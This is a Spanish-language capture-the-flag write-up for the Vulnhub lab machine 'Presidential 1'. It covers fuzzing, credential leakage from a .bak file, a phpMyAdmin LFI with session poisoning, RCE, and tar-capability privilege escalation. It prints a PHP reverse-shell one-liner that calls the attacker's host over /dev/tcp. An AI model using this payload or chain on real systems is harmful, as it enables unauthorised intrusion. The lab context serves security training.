---
author: Helder
title: Vulnhub - Presidential 1
tags : [Linux,LFI]
categories: [Vulnhub,Medium]
date: 2023-10-15 11:33:00 +0800
mermaid: true
---
Description: The Presidential Elections within the USA are just around the corner (November 2020). One of the political parties is concerned that the other political party is going to perform electoral fraud by hacking into the registration system, and falsifying the votes.

The state of Ontario has therefore asked you (an independent penetration tester) to test the security of their server in order to alleviate any electoral fraud concerns. Your goal is to see if you can gain root access to the server – the state is still developing their registration website but has asked you to test their server security before the website and registration system are launched.

This CTF was created and has been tested with VirtualBox. It should also be compatible with VMWare and is DHCP enabled.

Máquina [**Presidential**](https://www.vulnhub.com/entry/presidential-1,500/)

---
## Reconocimiento

- [ ] arp scan
Realizamos el respectivo escaneo

![arp](https://helhat.github.io/assets/img/Presidential/arp.png){: .normal }

- [ ] nmap
Descubrimos los puertos abiertos.

![scan1](https://helhat.github.io/assets/img/Presidential/scan1.png){: .normal }

Realizamos el escaneo correspondiente der versiones y scripts básico de nmap.

![scan2](https://helhat.github.io/assets/img/Presidential/scan2.png){: .normal }

---
## Enumeración
- [ ] Identificamos tecnologías con whatweb y  nos percatamos que existe un dominio en particular y utilizan php.

![what](https://helhat.github.io/assets/img/Presidential/what.png){: .normal }
![vote](https://helhat.github.io/assets/img/Presidential/vote.png){: .normal }

- [ ] Configuramos virtual hosting

![virtual](https://helhat.github.io/assets/img/Presidential/virtual.png){: .normal }

- [ ] Fuzzing

![fuzz](https://helhat.github.io/assets/img/Presidential/fuzz.png){: .normal }

Enumeramos los archivos sin tanto éxito.

![assests](https://helhat.github.io/assets/img/Presidential/assets.png){: .normal }

- [ ] Fuzzing dir virtual hosting , con alguna extensiones comunes, pero con el mismo resultado

![fuzz2](https://helhat.github.io/assets/img/Presidential/fuzz2.png){: .normal }

El archivo config.php no muestra nada, posiblemente por que lo está interpretando.
Si realizamos fuzzeo de virtual hosting usando vhost tendremos varios estados, así que intentaremos filtrar por el estado 200

![fuzz3](https://helhat.github.io/assets/img/Presidential/fuzz3.png){: .normal }
![fuzz4](https://helhat.github.io/assets/img/Presidential/fuzz4.png){: .normal }
![status](https://helhat.github.io/assets/img/Presidential/status.png){: .normal }
![login](https://helhat.github.io/assets/img/Presidential/login.png){: .normal }

- [ ] fuzzing extensiones. Esta vez realizaremos una búsqueda de extensiones adicional de php.bak , encontrando un recurso importante.

![fuzz5](https://helhat.github.io/assets/img/Presidential/fuzz5.png){: .normal }

Estas credenciales parecen ser de la ruta de logueo.

![cred](https://helhat.github.io/assets/img/Presidential/cred.png){: .normal }
![logueo](https://helhat.github.io/assets/img/Presidential/logueo.png){: .normal }

Teniendo acceso a esta plataforma enumeramos usuarios y funciones, uno de ellos tenemos unas credenciales

![enum](https://helhat.github.io/assets/img/Presidential/enum.png){: .normal }

Creamos un archivo y procedemos a crackearlo.

![hash](https://helhat.github.io/assets/img/Presidential/hash.png){: .normal }
![crack](https://helhat.github.io/assets/img/Presidential/crack.png){: .normal }

Dejamos un buen tiempo y mostramos nuestra password será Stella.
Es necesario indicar que el servicio ssh no permite conexiones por el puerto 2082.
Ahora buscaremos una manera de explotar esta plataforma phpMyAdmin según su versión.

![enum2](https://helhat.github.io/assets/img/Presidential/enum2.png){: .normal }

- [ ] searchsploit 

![search](https://helhat.github.io/assets/img/Presidential/search.png){: .normal }

En esta ocasión tenemos un RCE, pero antes debemos saber en donde aplicarlo.

---
## Explotación

### LFI
- [ ] Buscamos por la web y encontramos 1 recurso adicional que nos indica la ruta igual que el exploit de searchploit.

![vuln](https://helhat.github.io/assets/img/Presidential/vuln.png){: .normal }

En tal caso tenemos la siguiente ruta para un LFI.
✔En caso no permita el ? , lo podemos urlencodear %3f.
Como se mencionó anteriormente teníamos un script, aquí podemos observar una ruta, la diferencia es que cambiaremos el /sessions/ por /session/  y colocaremos nuestro cookie de sesion.

![url](https://helhat.github.io/assets/img/Presidential/url.png){: .normal }

Intentaremos un LFI en /etc/passwd , siendo exitoso.

![lfi](https://helhat.github.io/assets/img/Presidential/lfi.png){: .normal }

Como podemos notar tenemos respuesta usando como parámetro *db_sql.php*, de esta manera probaremos una inyección de comandos tipo php en una query SQL.

![query](https://helhat.github.io/assets/img/Presidential/query.png){: .normal }

O con un simple hola

![test](https://helhat.github.io/assets/img/Presidential/test.png){: .normal }

- [ ] LFI Log poisoning - ruta del script - ID logueo
Confirmado que interpreta la query, intentaremos llegar a la dirección completa con nuestro ID nuevamente. Y es aquí donde vemos la respuesta reflejada.  De esta manera cuando generemos nuestro RCE solo tendremos que actualizar la web en esta ruta.

![ses](https://helhat.github.io/assets/img/Presidential/ses.png){: .normal }

### RCE - SQL
- [ ] RCE
Ahora que conocemos el lugar donde ejecutar un comando, intentaremos un RCE. Tener en cuenta que si bien es una query SQL, esta bajo un lenguaje php, debemos tener la sintaxis presente.

![rce](https://helhat.github.io/assets/img/Presidential/rce.png){: .normal }

```
'<?php system("bash -i >& /dev/tcp/192.168.65.139/1234 0>&1"); ?>';
```
Luego de mandar el one liner para nuestro reverse shell , ingresamos la dirección del script, en la web.

![url](https://helhat.github.io/assets/img/Presidential/url.png){: .normal }

Actualizamos la web. Esto nos dará la reverse shell.

![netcat](https://helhat.github.io/assets/img/Presidential/netcat.png){: .normal }

- [ ] Mejorar
Por cuestiones de practicidad mejoramos la Terminal
```
script /dev/null -c bash
stty raw -echo; fg
	reset xterm
export TERM=xterm
export SHELL=bash
stty rows 35 columns 140
```

---
## Escala Privilegios - Persistencia

- [ ] Cuando usamos jhon the ripper para cifrar la password encriptada---- Stella, podemos usarlo aquí, solo quedaría saber que usuario es el correcto.

![esc](https://helhat.github.io/assets/img/Presidential/esc.png){: .normal }

Enumerando el sistema en busca de permisos suid, sudo, etc y archivos. Encontramos un documento interesante.

![notes](https://helhat.github.io/assets/img/Presidential/notes.png){: .normal }

Como nos indica en este archivo, buscaremos algo relacionado a un comprimido.
- [ ] Capabilities
Buscando capabilities encontramos un binario tar.

![cap](https://helhat.github.io/assets/img/Presidential/cap.png){: .normal }

- [ ] cvf
El objetivo ahora es crear un comprimido tar, de un archivo o directorio con permisos privilegiados que normalmente no tenemos acceso. Y finalmente intentar acceder a este descomprimiendolo.

![desc](https://helhat.github.io/assets/img/Presidential/desc.png){: .normal }
![desc2](https://helhat.github.io/assets/img/Presidential/desc2.png){: .normal }

Revisamos la carpeta descomprimida

![root](https://helhat.github.io/assets/img/Presidential/root.png){: .normal }

- [ ] ssh
En un entorno CTF esto sirve, pero para generar una Escalada de privilegios mas real, podemos usar este mismo binario *tarS* para comprimir solo la key del .ssh y tener acceso por el puerto 2082; o ya con toda la carpeta root/ comprimida, aprovechar en acceder solo a este archivo.

![key](https://helhat.github.io/assets/img/Presidential/key.png){: .normal }

Lo copiamos en nuestra PC atacante

![copy](https://helhat.github.io/assets/img/Presidential/copy.png){: .normal }

Cambiamos permisos

![perm](https://helhat.github.io/assets/img/Presidential/perm.png){: .normal }
![root2](https://helhat.github.io/assets/img/Presidential/root2.png){: .normal }

Ahora si tendremos acceso a todo el sistema.

